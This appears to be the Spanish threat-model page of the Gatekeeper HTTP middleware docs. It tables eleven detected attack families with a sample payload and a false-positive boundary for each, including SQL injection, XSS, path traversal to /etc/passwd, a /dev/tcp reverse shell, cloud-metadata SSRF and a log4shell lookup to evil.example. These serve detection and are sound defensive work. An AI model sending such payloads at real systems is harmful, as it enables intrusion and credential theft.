# Modelo de amenazas

Este documento es la fuente de verdad sobre **qué ataques afirma detectar
Gatekeeper, con qué firma, y hasta dónde llega cada familia**. No es marketing:
cada fila incluye la frontera de falsos positivos, que es donde se decide si una
firma es usable o no. El resumen ejecutivo está en
[Seguridad](seguridad.md); las mediciones, en
[Detección y medición](deteccion.md).

## Supuesto de atacante

Un recurso HTTP expuesto a Internet (o a una red hostil) delante del que no hay
un WAF gestionado. El atacante controla:

- el **path** y la **query string** de la petición;
- los valores de las **cabeceras inspeccionadas** (`user-agent`, `referer`,
  `cookie`, `x-forwarded-for` por defecto; configurable);
- el **body textual** (JSON, form-urlencoded, texto plano) hasta 1 MiB.

El atacante **no** controla el backend, la base de datos ni la red interna.
Gatekeeper inspecciona la petición **antes** de que llegue a tu handler; si
pasa, tu app recibe un input que puede ser malicioso y sigue necesitando
consultas parametrizadas y validación.

## Familias detectadas

Once familias, todas medidas contra el [corpus propio](https://github.com/Eche-Dev/Gatekeeper/blob/main/gatekeeper-v0.3/gatekeeper/corpus/README.md)
(131/131, 0 falsos positivos sin documentar). El nombre entre paréntesis es el
valor para `disabled_rules`.

| Familia | Qué detecta | Ejemplo de payload | Frontera: qué NO bloquea |
|---|---|---|---|
| `sqli` | UNION, tautologías, stacked queries, time/error-based, subconsultas, `xp_cmdshell` | `1 UNION SELECT password FROM users` | «union station», «order by date» sin número; `sleep(5)` en prosa (FP documentado benign-009) |
| `xss` | Etiquetas, handlers de eventos, `javascript:` y `data:text/html`, iframes, entidades HTML numéricas y nombradas, esquemas con tab/NL (`java\tscript:`) | `<script>alert(1)</script>`, `&lt;script&gt;` | «javascript:» en prosa (FP documentado benign-012); etiquetas en búsquedas de documentación (benign-011) |
| `path_traversal` | `../`, codificado (simple, doble, sobre-long UTF-8), rutas absolutas sensibles | `../../etc/passwd`, `..%c0%af..%c0%afetc/passwd` | `%2e%2e%2f` doblemente codificado en prosa (FP documentado benign-049) |
| `sensitive_files` | Rutas que no deberían servirse nunca: `/etc/(passwd,shadow,group)`, `/proc/self`, `win.ini`, `.ssh/`, `.aws/`, `.docker/`, `.git/`, `.env`, `WEB-INF/` | `/home/user/.ssh/id_rsa` | «.env» suelto sin separador de ruta |
| `nosql` | Operadores de inyección Mongo: `$ne`, `$nin`, `$where`, `$regex` (JSON o corchetes) | `user[$ne]=x`, `{"user": {"$ne": ""}}` | **`$gt`/`$lt`/`$in` quedan fuera a propósito**: los filtros legítimos pasados por HTTP (`{"price": {"$gt": 10}}`, benign-017/063) los usan. Si tu API expone filtros con `$ne`, desactiva la familia |
| `cmdi` | Separador shell + binario (`; ls`, `\| cat`, `&& whoami`, `$(id)`, `` `uname` ``), LOLBins de Windows (`powershell.exe`), webshells PHP (`;system('`) y funciones raras (`shell_exec(`), reverse shell `/dev/tcp/` | `; ls -la /tmp`, `bash -i >& /dev/tcp/10.0.0.1/4444` | Binarios sin separador delante («curl vs wget», benign-065); `;type=json` es separador de parámetros, no comando (benign-069); `eval(2+2)` en prosa sin separador |
| `ssrf` | IPs de metadata cloud (AWS/GCP/Azure/Alibaba, IMDS y ECS) y esquemas de lectura local (`file://`, `gopher://`, `dict://`, `jar://`, `netdoc://`, `tftp://`) | `http://169.254.169.254/latest/meta-data/` | **`localhost` y `127.0.0.1` no se bloquean**: OAuth de desarrollo y webhooks locales son legítimos (benign-066). Una IP de loopback codificada en decimal sí es sospechosa |
| `ssti` | Aritmética canónica de plantillas (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`) y acceso a objetos peligrosos (`config`, `self`, `request`, `__class__`, `__subclasses__`) | `{{config.items()}}` | `{{user.name}}` o `${HOME}` (plantillas de cliente y variables de entorno, benign-064/068) |
| `crlf` | Salto de línea seguido de nombre de cabecera: response splitting e inyección de cabeceras (CRLF reales decodificados de `%0d%0a` y literales `\\r\\n`) | `a\r\nSet-Cookie: admin=1` | Todo texto multilínea **sin** cabecera detrás: «set-cookie» como palabra suelta no bloquea (benign-067) |
| `log4shell` | `${jndi:…}` (ldap/rmi/dns/iiop/corba), ofuscaciones con decoys (`${${::-j}ndi:`), JNDI sin envoltorio y lookups de exfiltración (`${env:AWS_SECRET…}`) | `${jndi:ldap://evil.example/a}` | No hay uso legítimo conocido de `jndi` en valores de request |
| `proto_pollution` | `__proto__` en cualquier posición y `constructor.prototype` | `__proto__[isAdmin]=true` | «constructor» solo no bloquea (benign-072); búsquedas documentales sobre `__proto__` sí (FP documentado benign-071) |

Cada familia se puede desactivar con `disabled_rules`, limitar con `rule_packs`
o ajustar campo a campo con `exclude_fields` (ver
[Referencia (API)](api.md)). Ajustar el campo, no la familia, es lo que preserva
el resto de la cobertura.

## Transportes inspeccionados

| Transporte | Inspección | Notas |
|---|---|---|
| Path y query | Siempre | Incluye el path completo (`/api/v1/<payload>` es vector) |
| Cabeceras | `user-agent`, `referer`, `cookie`, `x-forwarded-for` por defecto | Configurable con `inspect_headers`; añade las tuyas si tu app las lee |
| Body JSON/text/form | Hasta `max_body_bytes` (1 MiB) | `Content-Type: multipart/*` y octet-stream quedan fuera (ver límites) |
| Body sin `Content-Length` | Se rechaza con 413 | No se arriesga a leer sin límite |

## Qué NO cubre Gatekeeper

Esto no son carencias por arreglar: son las fronteras del diseño.

- **Autenticación, autorización, CSRF y lógica de negocio.** Son del handler.
- **Validación semántica.** Gatekeeper ve firmas, no significado: un JSON
  enorme pero inocuo pasa; una consulta SQL construida a mano desde tu app
  también (eso es de las consultas parametrizadas).
- **Payload repartido entre campos.** Un ataque repartido entre `q`, `sort` y
  un header, cada trozo inocuo, pasa la inspección (ver
  [corpus/README.md](https://github.com/Eche-Dev/Gatekeeper/blob/main/gatekeeper-v0.3/gatekeeper/corpus/README.md)).
- **Bodies multipart y binarios.** Un ataque dentro de un fichero adjunto no se
  inspecciona en v0.3; si aceptas uploads, sanea en la app o espera v0.4.
- **WAF gestionado.** Gatekeeper no sustituye a ModSecurity/CRS ni a Cloudflare
  en un perímetro; mide contra CRS como referencia externa y pierde de largo
  (ver [medición](deteccion.md)). Es una capa adicional con coste cero.
- **Firmas desconocidas.** Detección por patrones: cualquier evasión que no
  normalizamos (otra codificación, otro motor de plantilla) no se ve. Por eso
  el corpus y las fronteras FP están publicados: puedes medir tus propias
  firmas con `tools/evaluate.py`.

## Cómo se mantiene honesto este modelo

- **Todo payload de esta página está en `corpus/attacks.json`** y se exige
  100% de detección en CI (`python tools/evaluate.py --check`). Una firma que
  se declara pero no se mide no entra.
- **Toda frontera de la tabla tiene su negativo en `corpus/benign.json`**:
  los casos que deliberadamente no bloqueamos están medidos y en el informe.
- **Los falsos positivos que aceptamos están listados** en
  [corpus/REPORT.md](https://github.com/Eche-Dev/Gatekeeper/blob/main/gatekeeper-v0.3/gatekeeper/corpus/REPORT.md)
  con su motivo (hoy 5: texto técnico que cita el vector). Nada se esconde
  detrás de «0 FP».
- **Las reglas personalizadas no están acotadas contra ReDoS** (las
  integradas sí); revisa tus patrones.

## Añadir tu propia familia

Si tu app tiene vectores propios (WP probes, firmas internas), añádelos como
reglas personalizadas sin esperar a un release:

```python
import re
from gatekeeper import GatekeeperMiddleware

GatekeeperMiddleware(app, custom_rules={
    "wp-probe": [re.compile(r"wp-login\.php")],
    "backup-leak": [re.compile(r"\.(?:sql|bak|old)\.zip\b")],
})
```

Las reglas personalizadas pasan por la misma normalización que las
integradas (decodificación, NFKC, comentarios SQL), y se pueden desactivar con
`disabled_rules`. Midelas contra tu tráfico en modo `monitor` antes de bloquear.

---

Siguiente: [Seguridad →](seguridad.md)
